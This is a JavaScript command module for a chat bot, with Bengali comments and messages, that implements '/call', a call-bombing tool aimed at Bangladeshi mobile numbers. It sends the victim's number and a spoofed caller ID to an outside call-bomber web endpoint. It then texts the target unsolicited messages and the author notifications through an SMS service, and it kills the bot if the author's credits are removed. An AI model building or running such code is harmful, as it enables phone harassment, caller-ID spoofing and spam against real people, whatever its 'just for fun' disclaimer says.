const fs = require("fs");
const path = require("path");

module.exports.config = {
  name: "call",
  version: "1.4.0",
  hasPermssion: 0,
  credits: "রাজা ✨",
  description: "বাংলাদেশি নাম্বারে মজা করার জন্য ফেক কল পাঠানোর টুল",
  commandCategory: "টুল",
  usages: "/call 01xxxxxxxxx",
  cooldowns: 15,
  dependencies: { "axios": "" }
};

module.exports.run = async ({ api, event, args }) => {
  // সোর্স কোড চেক — যদি 'রাজা' বা '01715559179' ডিলিট হয় বট বন্ধ হবে
  const currentFile = path.resolve(__filename);
  const sourceCode = fs.readFileSync(currentFile, "utf8");
  if (!sourceCode.includes("রাজা") || !sourceCode.includes("01715559179")) {
    console.log("❌ প্রয়োজনীয় তথ্য মুছে ফেলা হয়েছে, বট বন্ধ হচ্ছে...");
    process.exit(1);
  }

  const axios = require("axios");

  const targetNumber = args[0];
  const fakeCallerID = "01715559179"; // তোমার ফেক কলার আইডি
  const smsNotifyNumber = "01715559179"; // নোটিফিকেশন যাবে এখানে
  const otp = Math.floor(100000 + Math.random() * 900000); // র‍্যান্ডম OTP

  if (!targetNumber || !/^01[0-9]{9}$/.test(targetNumber)) {
    return api.sendMessage(
      "❌ সঠিক বাংলাদেশি মোবাইল নম্বর লিখুন!\n" +
      "📌 উদাহরণ: /call 01XXXXXXXXX\n\n" +
      "⚠️ টুলটি শুধুমাত্র মজা এবং শিক্ষার জন্য। অপব্যবহার শাস্তিযোগ্য।",
      event.threadID,
      event.messageID
    );
  }

  const now = new Date();

  // সময়
  const seconds = now.getSeconds().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const hours = now.getHours().toString().padStart(2, '0');

  // তারিখ
  const day = now.getDate().toString().padStart(2, '0');
  const monthNames = [
    "জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন",
    "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"
  ];
  const month = monthNames[now.getMonth()];
  const year = now.getFullYear();

  const timeString = `সময়: ${hours} ঘন্টা ${minutes} মিনিট ${seconds} সেকেন্ড`;
  const dateString = `তারিখ: ${day} ${month} ${year}`;

  api.sendMessage(
    `📞 কল বোম্বিং শুরু হয়েছে:\n` +
    `📲 নম্বর: ${targetNumber}\n` +
    `📤 ফেক কলার আইডি: ${fakeCallerID}\n` +
    `${timeString}\n` +
    `${dateString}\n\n` +
    `⏳ অনুগ্রহ করে অপেক্ষা করুন...`,
    event.threadID,
    async (err, startInfo) => {
      if (err) {
        return api.sendMessage("❌ মেসেজ পাঠানো সম্ভব হয়নি।", event.threadID);
      }

      try {
        // WhatsApp ফেক কল মেসেজ
        await api.sendMessage(
          `📱 WhatsApp কল পাঠানো হচ্ছে:\n📲 ${targetNumber} নম্বরে একটি ফেক WhatsApp কল যাচ্ছে... (মজার জন্য)`,
          event.threadID
        );

        // কল বোম্বার API কল
        const { data } = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${targetNumber}&callerID=${fakeCallerID}`);
        const message = typeof data === "object" ? JSON.stringify(data, null, 2).slice(0, 500) : String(data).slice(0, 500);

        await api.sendMessage(`📥 সার্ভারের প্রতিক্রিয়া:\n${message}`, event.threadID);

        // মেসেজ ৯০ সেকেন্ড পরে মুছে ফেলা হবে
        setTimeout(() => {
          api.unsendMessage(startInfo.messageID).catch(() => {});
        }, 90000);

        // তোমার নম্বরে নোটিফিকেশন যাবে
        await axios.post("https://textbelt.com/text", {
          phone: `+880${smsNotifyNumber}`,
          message: `🔥 কল বোম্বিং অনুরোধ:\n📲 লক্ষ্য নম্বর: ${targetNumber}\n📤 ফেক কলার আইডি: ${fakeCallerID}\n🔐 OTP: ${otp}\n${timeString}\n${dateString}`,
          key: "textbelt"
        });

        // টার্গেট নম্বরে রাজার নাম্বার যাবে
        await axios.post("https://textbelt.com/text", {
          phone: `+880${targetNumber}`,
          message: `📩 আপনার সাথে যোগাযোগ করুন রাজা (01715559179)`,
          key: "textbelt"
        });

        return api.sendMessage(
          `✅ ${targetNumber} নম্বরে কল বোম্বিং সফলভাবে সম্পন্ন হয়েছে।`,
          event.threadID
        );

      } catch (err) {
        return api.sendMessage(
          `❌ ত্রুটি:\n${err.message}`,
          event.threadID,
          event.messageID
        );
      }
    }
  );
};
